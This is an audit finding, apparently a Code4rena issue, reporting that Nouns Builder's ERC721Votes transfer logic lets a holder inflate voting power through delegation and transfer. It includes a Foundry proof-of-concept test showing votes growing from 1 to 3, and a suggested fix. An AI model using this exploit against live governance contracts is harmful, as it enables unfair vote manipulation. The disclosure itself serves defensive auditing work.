## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [`_transferFrom()` can be used to indefinitely increase voting power.](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224) 

# Lines of code

https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268


# Vulnerability details

## `_transferFrom()` can be used to indefinitely increase voting power.
### Impact
It is possible to indefinitely increase voting power by creating new accounts (addresses) and delegating. This will lead to unfair governance as a user can vote with more votes than actual.

### Explanation
The `_transferFrom()`  does not move delegates from the src's delegates to the destination's delegates, instead, it moves directly from src to dest. (see recommendations and Code POC for better understanding)

### Code POC
```solidity
// Insert this test case into Token.t.sol
// Run: forge test --match-contract Token -vv

import "forge-std/console.sol";
...
function testIncreaseVotePower() public {
        deployMock();

        address voter1;
        address voter2;
        uint256 voter1PK;
        uint256 voter2PK;

        // Voter with 1 NFT voting power
        voter1PK = 0xABC;
        voter1 = vm.addr(voter1PK);
        vm.deal(voter1, 1 ether);
        // Second account created by same voter
        voter2PK = 0xABD;
        voter2 = vm.addr(voter2PK);

		// Giving voter1 their 1 NFT
        vm.prank(founder);
        auction.unpause();
        vm.prank(voter1);
        auction.createBid{ value: 0.420 ether }(2);
        vm.warp(auctionParams.duration + 1 seconds);
        auction.settleCurrentAndCreateNewAuction();

        // Start Exploit
        console.log("Initial Votes");
        console.log("voter1: ", token.getVotes(voter1));
        console.log("voter2: ", token.getVotes(voter2));
        
        vm.prank(voter1);
        token.delegate(voter2);
        console.log("After Delegating Votes, voter1 -> delegate(voter2)");
        console.log("voter1: ", token.getVotes(voter1));
        console.log("voter2: ", token.getVotes(voter2));

        vm.prank(voter1);
        token.transferFrom(voter1, voter2, 2); 
        console.log("After Token transfer, voter1 -transferFrom()-> voter2");
        console.log("voter1 votes: ", token.getVotes(voter1));
        console.log("voter2 votes: ", token.getVotes(voter2));

        vm.prank(voter2);
        token.delegate(voter2);
        console.log("After Delegating Votes, voter2 -> delegate(voter2)");
        console.log("voter1: ", token.getVotes(voter1));
        console.log("voter2: ", token.getVotes(voter2));
    }
```
Expected Output:
```solidity
[PASS] testVoteDoublePower() (gas: 3544946)
Logs:
  Initial Votes
  voter1:  1
  voter2:  0
  After Delegating Votes, voter1 -> delegate(voter2)   
  voter1:  1
  voter2:  1
  After Token transfer, voter1 -transferFrom()-> voter2
  voter1 votes:  0
  voter2 votes:  2
  After Delegating Votes, voter2 -> delegate(voter2)   
  voter1:  0
  voter2:  3
```
### Recommendations
Looking at [OpenZeppelin's ERC721Votes](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6a8d977d2248cf1c115497fccfd7a2da3f86a58f/contracts/token/ERC721/extensions/draft-ERC721Votes.sol#L13) which I believe the team took reference from, it states:
```
* Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost
* on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of
* the votes in governance decisions, or they can delegate to themselves to be their own representative.
```
The current implementation does not follow this, and tokens count as votes without being delegated. To fix this issue, votes should only be counted when delegated.
- I believe the issue is here on this [line](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268)
```solidity
// Transfer 1 vote from the sender to the recipient
        _moveDelegateVotes(_from, _to, 1);
```
Where it should move from the delegate of `_from` to the delegate of `_to`. Suggested FIx:
```solidity
 _moveDelegateVotes(delegation[_from], delegation[_to], 1);
```
